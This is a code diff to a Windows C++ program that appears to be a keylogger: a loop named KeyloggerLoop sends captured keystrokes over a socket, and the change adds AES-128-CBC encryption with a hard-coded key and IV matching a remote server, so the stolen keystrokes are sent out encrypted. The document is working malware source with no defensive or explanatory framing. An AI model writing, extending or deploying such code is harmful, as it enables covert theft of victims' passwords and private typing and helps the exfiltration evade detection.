@@ -1,9 +1,30 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
+
 #include <iostream>
 #include <thread>
 #include <chrono>
+#include <openssl/conf.h>
+#include <openssl/evp.h>
+#include <openssl/err.h>
+#include <cstring>
+// AES key and IV (must match server)
+const unsigned char* AES_KEY = (const unsigned char*)"AfterLifeDeath00";
+const unsigned char* AES_IV  = (const unsigned char*)"AfterDeathLife00";
+
+// Encrypts plaintext to ciphertext using AES-128-CBC
+int aes_encrypt(const unsigned char* plaintext, int plaintext_len, unsigned char* ciphertext) {
+    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
+    int len, ciphertext_len;
+    EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, AES_KEY, AES_IV);
+    EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len);
+    ciphertext_len = len;
+    EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);
+    ciphertext_len += len;
+    EVP_CIPHER_CTX_free(ctx);
+    return ciphertext_len;
+}
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -60,7 +81,9 @@ void KeyloggerLoop() {
         const char* keys = GetKeyBuffer();
         if (keys && *keys != '\0') {
             int len = (int)strlen(keys);
-            int sent = send(sock, keys, len, 0);
+            unsigned char ciphertext[2048];
+            int ciphertext_len = aes_encrypt((const unsigned char*)keys, len, ciphertext);
+            int sent = send(sock, (const char*)ciphertext, ciphertext_len, 0);
             if (sent == SOCKET_ERROR) {
                 std::cerr << "send() failed\n";
                 break;
